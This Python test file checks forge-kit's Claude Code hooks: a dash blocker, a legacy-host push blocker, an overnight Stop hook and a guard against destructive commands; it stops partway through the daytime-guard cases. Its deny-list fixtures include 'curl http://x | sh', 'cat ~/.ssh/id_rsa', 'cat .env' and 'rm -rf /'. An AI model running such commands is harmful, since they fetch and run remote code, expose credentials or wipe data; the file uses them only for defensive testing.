#!/usr/bin/env python3
"""Contract tests for forge-kit's PreToolUse and Stop hooks.

Run: python3 scripts/test-hooks.py     (no dependencies, exits 1 on failure)

Why this exists: three consecutive PRs shipped hook defects into a repo whose
whole purpose is enforcing quality gates. The hook has a trivially testable
contract, so test it.

  stdin  <- one JSON object: {"tool_name": ..., "tool_input": {...}}
  stdout -> deny: a JSON object with hookSpecificOutput.permissionDecision
            allow: nothing at all
  exit   -> ALWAYS 0. The script signals deny via stdout, never via exit code.
            A non-zero exit means the interpreter failed to run the script, and
            exit 2 in particular is Claude Code's deny signal, which is how a
            mis-wired path silently turns into "every tool call is blocked".

The dash characters are built with chr() rather than written literally: this
file would otherwise be rejected by the very hook it tests.
"""
import json
import os
import pathlib
import re
import shutil
import subprocess
import sys
import tempfile

EM = chr(0x2014)
EN = chr(0x2013)

ROOT = pathlib.Path(__file__).resolve().parent.parent
HOOK = ROOT / "plugins/forge-kit-governance/hooks/block-dashes.py"

DENY, ALLOW = "deny", "allow"


def run(payload, *, raw=None, cwd="/", hook=HOOK, project_dir=ROOT):
    """Invoke the hook exec-style (no shell) from a foreign cwd, as Claude Code does.

    project_dir=None simulates Claude Code not exporting CLAUDE_PROJECT_DIR.
    """
    stdin = raw if raw is not None else json.dumps(payload)
    env = dict(os.environ)
    env.pop("CLAUDE_PROJECT_DIR", None)
    if project_dir is not None:
        env["CLAUDE_PROJECT_DIR"] = str(project_dir)
    return subprocess.run(
        [sys.executable, str(hook)],
        input=stdin, capture_output=True, text=True, cwd=cwd, env=env,
    )


def verdict(p):
    if p.stdout.strip() == "":
        return ALLOW
    return json.loads(p.stdout)["hookSpecificOutput"]["permissionDecision"]


CASES = [
    # (label, tool_name, tool_input, expected)
    ("Write, em dash",        "Write",        {"content": f"a {EM} b"},                 DENY),
    ("Write, en dash",        "Write",        {"content": f"a {EN} b"},                 DENY),
    ("Write, clean",          "Write",        {"content": "a - b"},                     ALLOW),
    ("Write, hyphen only",    "Write",        {"content": "well-formed"},               ALLOW),
    ("Edit, new_string",      "Edit",         {"new_string": f"x {EM} y"},              DENY),
    ("Edit, old_string only", "Edit",         {"old_string": f"x {EM} y",
                                               "new_string": "clean"},                  ALLOW),
    ("MultiEdit, nested",     "MultiEdit",    {"edits": [{"new_string": "ok"},
                                                         {"new_string": f"b {EN} c"}]}, DENY),
    ("MultiEdit, all clean",  "MultiEdit",    {"edits": [{"new_string": "ok"}]},        ALLOW),
    ("NotebookEdit",          "NotebookEdit", {"new_source": f"# {EM}"},                DENY),
    ("Bash, command",         "Bash",         {"command": f"echo {EM}"},                DENY),
    ("Bash, clean",           "Bash",         {"command": "echo hi"},                   ALLOW),
    ("unmatched tool (Read)", "Read",         {"content": f"a {EM} b"},                 ALLOW),
    ("non-string content",    "Write",        {"content": 123},                         ALLOW),
    ("missing tool_input",    "Write",        {},                                       ALLOW),
]

failures = []


def check(label, got, want, extra=""):
    ok = got == want
    print(f"  {'PASS' if ok else 'FAIL'}  {label:<28} got={got} want={want} {extra}")
    if not ok:
        failures.append(label)


print(f"block-dashes.py contract tests  ({HOOK.relative_to(ROOT)})\n")

for label, tool, tin, want in CASES:
    p = run({"tool_name": tool, "tool_input": tin})
    if p.returncode != 0:
        check(label, f"exit{p.returncode}", want, extra=p.stderr.strip()[:60])
        continue
    check(label, verdict(p), want)

# Exit code is part of the contract: deny is signalled on stdout, never by exiting non-zero.
p = run({"tool_name": "Write", "tool_input": {"content": f"a {EM} b"}})
check("deny still exits 0", p.returncode, 0)

# Fail open: unparseable stdin must never block a real tool call.
p = run(None, raw="{not json")
check("malformed stdin allows", verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)
check("malformed stdin exits 0", p.returncode, 0)

p = run(None, raw="")
check("empty stdin allows", verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)

# The deny payload must carry actionable guidance, not just a refusal.
p = run({"tool_name": "Write", "tool_input": {"content": f"a {EM} b"}})
reason = json.loads(p.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
check("deny reason names the char", "U+2014" in reason, True)
check("deny reason says restructure", "RESTRUCTURE" in reason.upper(), True)
check("deny reason warns off hyphen", "hyphen" in reason.lower(), True)

# Regression guard for #27..#29: the hook must work when cwd is not the repo root.
p = run({"tool_name": "Write", "tool_input": {"content": f"a {EM} b"}}, cwd="/")
check("works from foreign cwd", verdict(p), DENY)

# A JSON array/scalar is not a hook payload; must fail open rather than crash on .get().
p = run(None, raw="[1, 2, 3]")
check("non-dict payload allows", verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)

# No project root discoverable at all: fail open.
p = run({"tool_name": "Write", "tool_input": {"content": f"a {EM} b"}}, project_dir=None)
check("no project root allows", verdict(p), ALLOW)

# --- Opt-in gate -----------------------------------------------------------
# The plugin registers this hook in EVERY project. It must enforce only where the
# project opted in via .claude/no-dashes. A copy installed INTO the project is
# itself the opt-in and always enforces (back-compat for pre-existing installs).
print("\n  -- opt-in gate --")
dash = {"tool_name": "Write", "tool_input": {"content": f"a {EM} b"}}

with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()

    # (a) plugin-style: hook lives OUTSIDE the project root.
    plugin_dir = td / "plugin" / "hooks"
    plugin_dir.mkdir(parents=True)
    plugin_hook = plugin_dir / "block-dashes.py"
    shutil.copy(HOOK, plugin_hook)

    proj = td / "proj"
    (proj / ".claude").mkdir(parents=True)

    p = run(dash, hook=plugin_hook, project_dir=proj, cwd=str(proj))
    check("plugin copy, no sentinel", verdict(p), ALLOW, extra="(opinionated rule stays off)")

    (proj / ".claude" / "no-dashes").touch()
    p = run(dash, hook=plugin_hook, project_dir=proj, cwd=str(proj))
    check("plugin copy, sentinel", verdict(p), DENY, extra="(project opted in)")

    # (b) project-local install: hook lives INSIDE the project root, no sentinel.
    proj2 = td / "proj2"
    (proj2 / ".claude" / "hooks").mkdir(parents=True)
    local_hook = proj2 / ".claude" / "hooks" / "block-dashes.py"
    shutil.copy(HOOK, local_hook)

    p = run(dash, hook=local_hook, project_dir=proj2, cwd=str(proj2))
    check("project copy, no sentinel", verdict(p), DENY, extra="(install IS the opt-in)")

    p = run({"tool_name": "Write", "tool_input": {"content": "clean"}},
            hook=local_hook, project_dir=proj2, cwd=str(proj2))
    check("project copy, clean text", verdict(p), ALLOW)

    # Regression: a project install must enforce regardless of working directory,
    # and regardless of whether CLAUDE_PROJECT_DIR was exported. The previous gate
    # fell back to the payload's `cwd`, which is the session's directory and not
    # the project root, so a session started in a subdirectory silently allowed.
    sub = proj2 / "src" / "deep"
    sub.mkdir(parents=True)

    p = run(dash, hook=local_hook, project_dir=None, cwd=str(sub))
    check("project copy, cwd=subdir", verdict(p), DENY, extra="(no CLAUDE_PROJECT_DIR)")

    payload_with_cwd = dict(dash, cwd=str(sub))
    p = run(payload_with_cwd, hook=local_hook, project_dir=None, cwd=str(sub))
    check("project copy, payload cwd=subdir", verdict(p), DENY)

    p = run(dash, hook=local_hook, project_dir=proj2, cwd=str(sub))
    check("project copy, root set + subdir", verdict(p), DENY)

# --- hooks.json, as Claude Code would run it -------------------------------
# Parse the SHIPPED plugin registration and execute it, rather than a hand-written
# approximation. The sh wrapper exists so a project that never opted in does not pay
# a Python interpreter startup on every matched tool call.
print("\n  -- plugin registration (hooks.json) --")

HOOKS_JSON = ROOT / "plugins/forge-kit-governance/hooks/hooks.json"
spec = json.loads(HOOKS_JSON.read_text())
entry = spec["hooks"]["PreToolUse"][0]
reg = entry["hooks"][0]

check("matcher covers 5 tools", entry["matcher"], "Write|Edit|MultiEdit|NotebookEdit|Bash")
check("exec form (args present)", "args" in reg, True)
check("plugin root is braced", "${CLAUDE_PLUGIN_ROOT}" in " ".join(reg["args"]), True)


def invoke_registered(plugin_root, project_dir, payload, reg=reg):
    """Run hooks.json exactly as configured, substituting the path placeholder.

    `reg` defaults to the block-dashes entry; a guard row passes its own entry (#419)."""
    argv = [reg["command"]] + [
        a.replace("${CLAUDE_PLUGIN_ROOT}", str(plugin_root)) for a in reg["args"]
    ]
    env = dict(os.environ)
    env.pop("CLAUDE_PROJECT_DIR", None)
    if project_dir is not None:
        env["CLAUDE_PROJECT_DIR"] = str(project_dir)
    return subprocess.run(
        argv, input=json.dumps(payload), capture_output=True, text=True, env=env, cwd="/"
    )


with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    proot = td / "plugin"
    (proot / "hooks").mkdir(parents=True)
    shutil.copy(HOOK, proot / "hooks" / "block-dashes.py")
    proj = td / "proj"
    (proj / ".claude").mkdir(parents=True)

    p = invoke_registered(proot, proj, dash)
    check("registered, no sentinel", verdict(p), ALLOW)
    check("registered, no sentinel exit", p.returncode, 0)

    # The sh guard must SHORT-CIRCUIT, not merely reach the same verdict via the
    # script's own gate. Swap in a poison pill that denies unconditionally: if the
    # interpreter is spawned at all, this denies and the test fails. Without this,
    # deleting the guard is invisible here (same decision, 24x the cost per call).
    poison = proot / "hooks" / "block-dashes.py"
    original = poison.read_bytes()
    poison.write_text(
        "import json,sys\n"
        'print(json.dumps({"hookSpecificOutput":'
        '{"hookEventName":"PreToolUse","permissionDecision":"deny",'
        '"permissionDecisionReason":"POISON: interpreter was spawned"}}))\n'
    )
    p = invoke_registered(proot, proj, dash)
    check("no sentinel spawns no python", verdict(p), ALLOW, extra="(guard short-circuits)")
    poison.write_bytes(original)

    (proj / ".claude" / "no-dashes").touch()
    p = invoke_registered(proot, proj, dash)
    check("registered, opted in", verdict(p), DENY)
    check("stdin reaches the script", "U+2014" in p.stdout, True)

    p = invoke_registered(proot, proj, {"tool_name": "Write", "tool_input": {"content": "a - b"}})
    check("registered, clean text", verdict(p), ALLOW)

    p = invoke_registered(proot, None, dash)
    check("registered, no CLAUDE_PROJECT_DIR", verdict(p), ALLOW, extra="(fail open)")

# --- block-legacy-host-push -------------------------------------------------
# This hook ships its own verdict matrix (`--self-test`), which nothing ever ran.
# Run it here so CI gates it, then cover the contract paths the matrix omits:
# malformed input, non-Bash tools, and the exit-code convention.
print("\n  -- block-legacy-host-push --")

BLHP = ROOT / "plugins/forge-kit-devops/hooks/block-legacy-host-push.py"

# The hook lets FORGE_* env vars override .forge.conf, which is correct at runtime and
# fatal in a test. Without this scrub the suite passes in clean CI and fails for anyone
# who exported FORGE_LEGACY_HOSTS, FORGE_REMOTE or FORGE_PUSH_STRICT, i.e. exactly the
# people who migrated a repo off GitHub. The hook's own --self-test scrubs them too.
HERMETIC_ENV = {k: v for k, v in os.environ.items() if not k.startswith("FORGE_")}

p = subprocess.run([sys.executable, str(BLHP), "--self-test"],
                   capture_output=True, text=True, cwd="/", env=HERMETIC_ENV)
matrix_cases = p.stdout.count("want=")
check("self-test matrix passes", p.returncode, 0, extra=f"({matrix_cases} verdict cases)")
if p.returncode != 0:
    print(p.stdout[-800:])

# `--self-test` is a documented entry point a maintainer runs by hand, so it must scrub
# FORGE_* itself rather than lean on this harness having done so. Inject the vars that
# used to break it: FORGE_PUSH_STRICT=1 would deny `git push fork main` cases, and
# FORGE_LEGACY_HOSTS would move github.com off the deny list.
polluted = dict(HERMETIC_ENV, FORGE_PUSH_STRICT="1",
                FORGE_LEGACY_HOSTS="gitlab.example.com", FORGE_REMOTE="github")
p = subprocess.run([sys.executable, str(BLHP), "--self-test"],
                   capture_output=True, text=True, cwd="/", env=polluted)
check("self-test is hermetic", p.returncode, 0, extra="(FORGE_* in env must not leak in)")


def run_blhp(payload, *, raw=None, cwd="/"):
    stdin = raw if raw is not None else json.dumps(payload)
    return subprocess.run([sys.executable, str(BLHP)],
                          input=stdin, capture_output=True, text=True, cwd=cwd,
                          env=HERMETIC_ENV)


# Fail-open and tool-filter paths. A repo with no .forge.conf allows everything, so
# use cwd=/ where no .forge.conf can exist: these assert the hook never blocks.
for label, kwargs in [
    ("malformed stdin", dict(raw="{not json")),
    ("empty stdin", dict(raw="")),
    ("non-dict payload", dict(raw="[1,2,3]")),
]:
    p = run_blhp(None, **kwargs)
    check(f"blhp {label} allows", verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)

p = run_blhp({"tool_name": "Bash", "tool_input": {"command": "git push github main"}})
check("blhp unconfigured repo allows", verdict(p), ALLOW, extra="(no .forge.conf)")
check("blhp always exits 0", p.returncode, 0)

p = run_blhp({"tool_name": "Bash", "tool_input": {}})
check("blhp missing command allows", verdict(p), ALLOW)

# A CONFIGURED repo, so the tool filter is exercised against a payload that would
# otherwise deny. Passing the same push command under tool_name=Write must allow:
# without a real deny to contrast against, "ignores non-Bash" passes vacuously.
with tempfile.TemporaryDirectory() as td:
    repo = pathlib.Path(td).resolve()

    # Report a broken fixture through check() like everything else, rather than raising:
    # a silently broken fixture makes every verdict ALLOW (no repo, so no config is
    # found) and reports that as a hook regression, while raising SystemExit would skip
    # the FAILED summary and drop any failures already collected.
    fixture_error = None
    for step in [("init", "-q", "-b", "main", "."),  # -b needs git >= 2.28
                 ("-c", "user.name=t", "-c", "user.email=t@t",
                  "commit", "-q", "--allow-empty", "-m", "b"),
                 ("remote", "add", "origin", "https://forge.example.com/o/r.git"),
                 ("remote", "add", "github", "https://github.com/o/r.git")]:
        r = subprocess.run(["git", "-C", str(repo)] + list(step), capture_output=True, text=True)
        if r.returncode != 0:
            first = ((r.stderr or "").strip().splitlines() or [""])[0]
            fixture_error = f"git {' '.join(step)}: {first}"
            break
    (repo / ".forge.conf").write_text("FORGE_HOST=forgejo\nFORGE_REMOTE=origin\n")
    check("fixture repo built", fixture_error, None)

    push_legacy = {"tool_input": {"command": "git push github main"}, "cwd": str(repo)}

    if fixture_error:
        # Without a repo every verdict is ALLOW, so the cases below would fail and blame
        # the hook. The one honest failure above is the whole signal.
        print("  SKIP  3 case(s) that depend on the fixture")
    else:
        p = run_blhp(dict(push_legacy, tool_name="Bash"), cwd=str(repo))
        check("blhp configured repo denies", verdict(p), DENY, extra="(github.com is legacy)")

        p = run_blhp(dict(push_legacy, tool_name="Write"), cwd=str(repo))
        check("blhp ignores non-Bash", verdict(p), ALLOW,
              extra="(same command, would deny on Bash)")

        p = run_blhp({"tool_name": "Bash", "tool_input": {"command": "git push origin main"},
                      "cwd": str(repo)}, cwd=str(repo))
        check("blhp allows the forge remote", verdict(p), ALLOW)

# Wiring: nothing may teach a relative hook path as a command or arg VALUE (the #27 bug
# class). Only quoted values count. Prose saying "copy it to `.claude/hooks/x.py`" and a
# manual `python3 .claude/hooks/x.py --self-test` are both correct and relative.
# A value qualifies when `.claude/hooks/` starts it or follows whitespace, so
# "${CLAUDE_PROJECT_DIR}/.claude/hooks/x.py" is excluded while both
# "python3 .claude/hooks/x.py" and ".claude/hooks/x.py" are caught.
#
# Scans the whole tree, not a fixed list. The two substring checks this replaces missed
# the args form entirely, and passed only because "${CLAUDE_PROJECT_DIR}" happened to
# occur exactly once in the file.
# `(?:\.\.?/)*` also catches the ./ and ../ spellings. Without it, "./.claude/hooks/x.py"
# slipped through: the './' is neither whitespace nor the start of the value.
RELATIVE_HOOK_VALUE = re.compile(r'"(?:[^"\n]*\s)?(?:\.\.?/)*\.claude/hooks/[\w.-]+\.py[^"\n]*"')
SELF = pathlib.Path(__file__).resolve()

# Scan TRACKED files, not the filesystem. globbing walked gitignored temp/ scratch notes,
# so a maintainer pasting the old wiring into a scratch file failed the suite locally
# while CI, which checks out a clean tree, stayed green. That local/CI divergence is the
# same defect this suite exists to prevent.
tracked = subprocess.run(["git", "-C", str(ROOT), "ls-files", "-z"],
                         capture_output=True, text=True)
if tracked.returncode != 0:
    check("tree scan can enumerate tracked files", tracked.returncode, 0)
    paths = []
else:
    paths = [ROOT / p for p in tracked.stdout.split("\0") if p]

scanned, offenders = 0, []
for path in sorted(paths):
    if path.suffix not in {".py", ".md", ".json"} or path == SELF or not path.is_file():
        continue  # SELF documents the pattern it forbids
    scanned += 1
    for m in RELATIVE_HOOK_VALUE.finditer(path.read_text(errors="replace")):
        offenders.append(f"{path.relative_to(ROOT)}: {m.group(0)}")

check("no relative hook wiring anywhere", offenders, [], extra=f"({scanned} tracked files)")
check("blhp docstring anchors path", "${CLAUDE_PROJECT_DIR}" in BLHP.read_text(), True)

# It must stay project-local: registering it in a plugin hooks.json would activate it
# from `.forge.conf`, which exists before cutover, breaking the migration's dual-remote
# window. Assert the HOOK is unreferenced, not that the directory has no hooks.json:
# a future devops hook may legitimately need one.
devops_reg = ROOT / "plugins/forge-kit-devops/hooks/hooks.json"
registered = "block-legacy-host-push" in devops_reg.read_text() if devops_reg.exists() else False
check("blhp not plugin-registered", registered, False, extra="(cutover is the opt-in)")

# --- overnight-continue (Stop hook) ----------------------------------------
# A Stop hook that keeps one working-overnight cycle from idling to a stop while a
# run is armed (.claude/overnight/active.md present). It is a safety net, not the
# loop engine. Contract (verified vs Claude Code 2.1.207): continue = exit 0 +
# {"decision":"block","reason":...}; allow stop = exit 0 + no stdout. Fails OPEN
# to allow-stop on any error, a non-dict payload, stop_hook_active, or no manifest.
print("\n  -- overnight-continue (Stop hook) --")

OVERNIGHT = ROOT / "plugins/forge-kit-governance/hooks/overnight-continue.py"


def stop_verdict(p):
    if p.stdout.strip() == "":
        return "allow-stop"
    return "continue" if json.loads(p.stdout).get("decision") == "block" else "allow-stop"


with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    armed = td / "armed"
    (armed / ".claude" / "overnight").mkdir(parents=True)
    (armed / ".claude" / "overnight" / "active.md").write_text("run manifest")
    disarmed = td / "disarmed"
    (disarmed / ".claude").mkdir(parents=True)

    active = {"hook_event_name": "Stop", "stop_hook_active": False}

    p = run(active, hook=OVERNIGHT, project_dir=armed, cwd=str(armed))
    check("armed run continues",
          stop_verdict(p) if p.returncode == 0 else f"exit{p.returncode}", "continue")
    check("continue exits 0", p.returncode, 0)

    p = run({"hook_event_name": "Stop", "stop_hook_active": True},
            hook=OVERNIGHT, project_dir=armed, cwd=str(armed))
    check("stop_hook_active allows stop", stop_verdict(p), "allow-stop",
          extra="(do not push the 8-block cap)")

    p = run(active, hook=OVERNIGHT, project_dir=disarmed, cwd=str(disarmed))
    check("disarmed allows stop", stop_verdict(p), "allow-stop", extra="(dormant)")

    p = run(None, raw="{not json", hook=OVERNIGHT, project_dir=armed, cwd=str(armed))
    check("overnight malformed allows stop",
          stop_verdict(p) if p.returncode == 0 else f"exit{p.returncode}", "allow-stop")
    check("overnight malformed exits 0", p.returncode, 0)

    p = run(None, raw="[1, 2, 3]", hook=OVERNIGHT, project_dir=armed, cwd=str(armed))
    check("overnight non-dict allows stop",
          stop_verdict(p) if p.returncode == 0 else f"exit{p.returncode}", "allow-stop")

    # No CLAUDE_PROJECT_DIR: the hook falls back to the payload cwd to find the manifest.
    p = run(dict(active, cwd=str(armed)), hook=OVERNIGHT, project_dir=None, cwd=str(armed))
    check("armed via payload cwd", stop_verdict(p), "continue")

# --- overnight-continue registration (hooks.json) --------------------------
print("\n  -- overnight-continue registration --")
stop_reg = spec["hooks"]["Stop"][0]["hooks"][0]
check("Stop hook exec form", "args" in stop_reg, True)
check("Stop hook plugin root braced", "${CLAUDE_PLUGIN_ROOT}" in " ".join(stop_reg["args"]), True)
check("Stop hook targets overnight-continue", "overnight-continue.py" in " ".join(stop_reg["args"]), True)

# --- overnight-guard (PreToolUse Bash) -------------------------------------
# While a working-overnight run is armed (.claude/overnight/active.md present),
# deny destructive git and secrets/bulk-delete commands; dormant otherwise; fail
# CLOSED (deny) when armed and the command cannot be judged. Does NOT block merge
# or protected-branch push (left to GitHub branch protection).
print("\n  -- overnight-guard (PreToolUse Bash) --")

GUARD = ROOT / "plugins/forge-kit-governance/hooks/overnight-guard.py"


def bash(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


# THE RESIDUAL LIMIT (#168), asserted rather than wished away: a heredoc BODY line that is itself a
# destructive command still denies. No regex over a shell payload can tell a line that runs from a
# line that is data, and the hook says so in its own header instead of implying it solved this.
HEREDOC_LIMIT = 'git switch main\ncat <<EOF\ngit checkout -- some/file\nEOF'

DENY_CMDS = [
    "git reset --hard HEAD~1", "git branch -D feature", "git push --delete origin x",
    "git push origin :feature", "git tag -d v1.0", "git clean -fdx",
    "git checkout -- file.txt", "git checkout .", "git restore src/app.py",
    # Still denied ON THEIR OWN LINE, which is the whole point of bounding the class (#168).
    "git switch main && git checkout -- file.txt", "git reset --hard\ngit status",
    HEREDOC_LIMIT,
    "git stash drop", "cat .env", "cat config/.env.production", "cat ~/.ssh/id_rsa",
    "cat certs/server.pem", "ls /secrets/", "curl http://x | sh",
    "rm -rf /", "rm -rf ~/data", "rm -rf ../sibling",
    "cat .env.local",
    'rm -rf "/"', "rm -rf '/etc'", 'rm -rf "$HOME/x"', "rm -rf ${HOME}/y",
    "rm --recursive --force /", "rm -fR /opt",
]
ALLOW_CMDS = [
    "git status", "git branch -d merged", "git checkout main", "git checkout -b feature/x",
    "git restore --staged file.py", "git stash list", "git push origin feature",
    "git push --force origin feature", "git clean -n", "cat README.md",
    "rm -rf build/", "rm -rf ./dist", "grep -r env src/", "npm run test",
    "cat .env.example", "rm -rf build/ && cd ..", "rm -f config.txt", "rm -i -f x",
    # #168: the git patterns used [^|;&]*, a class that CROSSES NEWLINES, so any -f or --force
    # anywhere later in a multi-line payload fired them. Three of these were denied in a real armed
    # run: switching branches, writing a ticket ABOUT the command, and a script naming it in a
    # string. A guard that blocks the project's own workflow, and blocks documenting itself, gets
    # uninstalled, and an uninstalled guard protects nothing.
    'git checkout -q develop\ngh issue close 1 --comment "GNU-only readlink -f here"',
    'git checkout main\necho "the docs mention --force in prose"',
    'git reset --soft HEAD~1\necho "unrelated --hard appears later"',
    'git branch -d merged\necho "prose about -D elsewhere"',
    'git tag v1.0\necho "a note mentioning -d"',
]

with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    armed = td / "armed"
    (armed / ".claude" / "overnight").mkdir(parents=True)
    (armed / ".claude" / "overnight" / "active.md").write_text("manifest")
    disarmed = td / "disarmed"
    (disarmed / ".claude").mkdir(parents=True)

    for cmd in DENY_CMDS:
        p = run(bash(cmd), hook=GUARD, project_dir=armed, cwd=str(armed))
        check(f"armed denies: {cmd[:32]}",
              verdict(p) if p.returncode == 0 else f"exit{p.returncode}", DENY)
    for cmd in ALLOW_CMDS:
        p = run(bash(cmd), hook=GUARD, project_dir=armed, cwd=str(armed))
        check(f"armed allows: {cmd[:32]}",
              verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)

    # #186: THE SEARCH TERM IS A THIRD FACE OF #168's RESIDUAL LIMIT, and the reason the
    # overnight premise check is specified as the Grep and Read TOOLS rather than as shell greps.
    # The patterns match anywhere in a Bash command string, including inside a quoted search term,
    # so READING the tree for a ticket that quotes a destructive command is denied, and the denial
    # is recorded as a destructive-command deferral that never happened. The guard returns
    # immediately for any non-Bash tool, which is what makes the tool choice safe rather than
    # merely tidy.
    searched = 'grep -rn "git reset --hard" docs/'
    p = run(bash(searched), hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed DENIES a read-only grep quoting a destructive command (the limit)",
          verdict(p) if p.returncode == 0 else f"exit{p.returncode}", DENY)
    p = run({"tool_name": "Grep", "tool_input": {"pattern": "git reset --hard", "path": "docs/"}},
            hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed allows the SAME search through the Grep tool (the escape)",
          verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)
    p = run({"tool_name": "Read", "tool_input": {"file_path": "docs/roadmap.md"}},
            hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed allows a Read of a file whose content it cannot see",
          verdict(p) if p.returncode == 0 else f"exit{p.returncode}", ALLOW)

    # Dormant when disarmed: even a destructive command is allowed.
    p = run(bash("rm -rf /"), hook=GUARD, project_dir=disarmed, cwd=str(disarmed))
    check("disarmed allows destructive", verdict(p), ALLOW)

    # Fail closed: armed + unparseable payload -> deny.
    p = run(None, raw="{not json", hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed malformed denies",
          verdict(p) if p.returncode == 0 else f"exit{p.returncode}", DENY)
    check("armed malformed exits 0", p.returncode, 0)

    # Fail closed: armed + Bash with no command string -> deny.
    p = run({"tool_name": "Bash", "tool_input": {}}, hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed no-command denies", verdict(p), DENY)

    # Non-Bash tool while armed -> allow (guard only judges Bash).
    p = run({"tool_name": "Write", "tool_input": {"content": "rm -rf /"}},
            hook=GUARD, project_dir=armed, cwd=str(armed))
    check("armed non-Bash allows", verdict(p), ALLOW)

    # Deny reason is actionable (names the park destination).
    p = run(bash("git reset --hard"), hook=GUARD, project_dir=armed, cwd=str(armed))
    reason = json.loads(p.stdout)["hookSpecificOutput"]["permissionDecisionReason"]
    check("deny reason says park", "decisions.md" in reason, True)

# --- overnight-guard registration (hooks.json) -----------------------------
print("\n  -- overnight-guard registration --")
guard_entry = next(e for e in spec["hooks"]["PreToolUse"] if "overnight-guard" in json.dumps(e))
guard_reg = guard_entry["hooks"][0]
check("guard matcher is Bash", guard_entry["matcher"], "Bash")
check("guard sh-gates on overnight sentinel",
      ".claude/overnight/active.md" in " ".join(guard_reg["args"]), True)
check("guard execs overnight-guard.py",
      "overnight-guard.py" in " ".join(guard_reg["args"]), True)
check("guard plugin root braced",
      "${CLAUDE_PLUGIN_ROOT}" in " ".join(guard_reg["args"]), True)

# --- overnight-guard, exact overnight strings and the daytime arm (#419) ---
# The overnight message was never pinned: the row above checks only the substring "decisions.md",
# so a refactor could edit PARK or either fail-closed string and pass. These rows pin all three by
# exact equality, then cover the daytime arm (.claude/no-destructive, no run armed).
print("\n  -- overnight-guard: exact overnight strings and the daytime arm (#419) --")

PARK_TXT = " Do not retry; record it in .claude/overnight/decisions.md and move on."
OVERNIGHT_TIER3 = ("overnight-guard: blocked a Tier-3 destructive command (git reset --hard) during an "
                   "armed overnight run." + PARK_TXT)
OVERNIGHT_UNPARSEABLE = ("overnight-guard: unparseable tool payload while a run is armed; blocked "
                         "(fail closed)." + PARK_TXT)
OVERNIGHT_NOCMD = ("overnight-guard: Bash call with no readable command while armed; blocked "
                   "(fail closed)." + PARK_TXT)
DAY_TAIL_TXT = (" A command that only quotes a dangerous string can go through the Write, Read or Grep"
                " tool or --body-file instead."
                " Do not retry another way; tell the user what you wanted to remove or discard.")


def day_msg(label):
    return (f"overnight-guard: blocked a destructive command ({label}); .claude/no-destructive is "
            f"present in this project." + DAY_TAIL_TXT)


def outcome(p):
    return verdict(p) if p.returncode == 0 else f"exit{p.returncode}"


def reason_of(p):
    return json.loads(p.stdout)["hookSpecificOutput"]["permissionDecisionReason"]


with tempfile.TemporaryDirectory() as td:
    td = pathlib.Path(td).resolve()
    night = td / "night"
    (night / ".claude" / "overnight").mkdir(parents=True)
    (night / ".claude" / "overnight" / "active.md").write_text("manifest")
    day = td / "day"
    (day / ".claude").mkdir(parents=True)
    (day / ".claude" / "no-destructive").touch()
    both = td / "both"
    (both / ".claude" / "overnight").mkdir(parents=True)
    (both / ".claude" / "overnight" / "active.md").write_text("manifest")
    (both / ".claude" / "no-destructive").touch()
    neither = td / "neither"
    (neither / ".claude").mkdir(parents=True)

    def go(payload, proj, raw=None):
        return run(payload, raw=raw, hook=GUARD, project_dir=proj, cwd=str(proj))

    # --- overnight: exact equality of all three reason strings
    p = go(bash("git reset --hard"), night)
    check("overnight tier-3 reason, exact", reason_of(p), OVERNIGHT_TIER3)
    p = go(None, night, raw="{not json")
    check("overnight unparseable reason, exact", reason_of(p), OVERNIGHT_UNPARSEABLE)
    p = go({"tool_name": "Bash", "tool_input": {}}, night)
    check("overnight no-command reason, exact", reason_of(p), OVERNIGHT_NOCMD)
    p = go(bash("git reset --hard"), both)
    check("both sentinels: overnight string wins, exact", reason_of(p), OVERNIGHT_TIER3)
    p = go(None, both, raw="{not json")
    check("both sentinels: overnight fails closed, exact", reason_of(p), OVERNIGHT_UNPARSEABLE)

    # --- daytime: every git class denies with the exact daytime string
    DAY_GIT = [
        ("git reset --hard HEAD~1", "git reset --hard"),
        ("git branch -D feature", "git branch -D"),
        ("git push --delete origin x", "git push --delete / :ref"),
        ("git push origin :feature", "git push --delete / :ref"),
        ("git tag -d v1.0", "git tag -d"),
        ("git clean -fdx", "git clean -f"),
        ("git checkout -- file.txt", "git checkout discards working tree"),
        ("git checkout .", "git checkout discards working tree"),
        ("git restore src/app.py", "git restore discards working tree"),
        ("git stash drop", "git stash drop/clear"),
        ("git switch main && git checkout -- file.txt", "git checkout discards working tree"),
        (HEREDOC_LIMIT, "git checkout discards working tree"),
        # #168/#186 limits carry over: a command that only QUOTES a destructive string still denies.
        ('grep -rn "git reset --hard" docs/', "git reset --hard"),
    ]
    for cmd, label in DAY_GIT:
        p = go(bash(cmd), day)
        check(f"day denies: {cmd[:30]!r}", outcome(p), DENY)
        if p.returncode == 0 and p.stdout.strip():
            check(f"day reason exact: {cmd[:24]!r}", reason_of(p), day_msg(label))
    p = go({"tool_name": "Grep", "tool_input": {"pattern": "git reset --hard", "path": "docs/"}}, day)
    check("day allows the same search through the Grep tool", outcome(p), ALLOW)

    # --- daytime: bulk delete, dangerous targets
    for cmd in ["rm -rf /", "rm -rf ~/data", "rm -rf ../sibling", 'rm -rf "$HOME/x"',
                "rm --recursive --force /", "rm -f a.txt && rm -rf $HOME/x"]:
        p = go(bash(cmd), day)
        check(f"day denies: {cmd[:30]!r}", outcome(p), DENY)
        if p.returncode == 0 and p.stdout.strip():
            check(f"day reason exact: {cmd[:24]!r}", reason_of(p), day_msg("rm -rf dangerous target"))

    # --- daytime: relative wildcard targets (maintainer pick, 2026-10-08)
